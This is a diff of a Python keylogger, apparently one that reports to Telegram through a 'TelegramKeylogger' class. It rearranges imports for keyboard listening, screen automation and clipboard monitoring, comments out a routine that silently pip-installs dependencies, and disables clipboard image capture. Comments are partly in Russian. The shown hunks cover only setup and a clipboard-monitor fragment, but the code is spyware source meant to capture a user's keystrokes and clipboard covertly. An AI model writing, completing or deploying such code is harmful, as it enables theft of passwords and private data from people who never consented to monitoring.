@@ -1,33 +1,46 @@
-import subprocess
-import sys
 import io
+import logging
+import getpass
+import threading
+import time
+from pynput import keyboard
+import pyautogui
+import hashlib
 from KeyloggerManager import TelegramKeylogger
 
-def install_packages():
-    packages = [
-        "Pillow", "hashlib", "pywin32", "pynput", "pyautogui", "python-dotenv", "requests", "pyperclip"
-    ]
-    for package in packages:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
-
-
 try:
-    from PIL import ImageGrab
-    from pynput.keyboard import Key, Listener
-    import logging
-    import getpass
-    import threading
-    import time
-    from pynput import keyboard
-    import pyautogui
-    import os
-    import hashlib
-    from pynput.keyboard import Key, Listener
-    from KeyloggerManager import TelegramKeylogger
-    import win32api
     import win32gui
 except ImportError:
-    install_packages()
+    pass
+
+# def install_packages():
+#     # packages = [
+#     #     "Pillow", "hashlib", "pywin32", "pynput", "pyautogui", "python-dotenv", "requests", "pyperclip"
+#     # ]
+#     packages = [
+#         "hashlib", "pywin32", "pynput", "pyautogui", "python-dotenv", "requests", "pyperclip"
+#     ]
+#     for package in packages:
+#         subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
+#
+#
+# try:
+#     # from PIL import ImageGrab
+#     from pynput.keyboard import Key, Listener
+#     import logging
+#     import getpass
+#     import threading
+#     import time
+#     from pynput import keyboard
+#     import pyautogui
+#     import os
+#     import hashlib
+#     from pynput.keyboard import Key, Listener
+#     from KeyloggerManager import TelegramKeylogger
+#     import win32api
+#     import win32gui
+# except ImportError:
+#     install_packages()
 
 username = getpass.getuser()
 
@@ -196,8 +209,8 @@ def clipboard_monitor(interval=5):
             logger.error(f"Clipboard monitor error: {e}")
 
         try:
-            image = ImageGrab.grabclipboard()
-
+            # image = ImageGrab.grabclipboard()
+            image = None
             if image is not None:
                 # Создаем хэш изображения для сравнения
                 img_bytes = io.BytesIO()
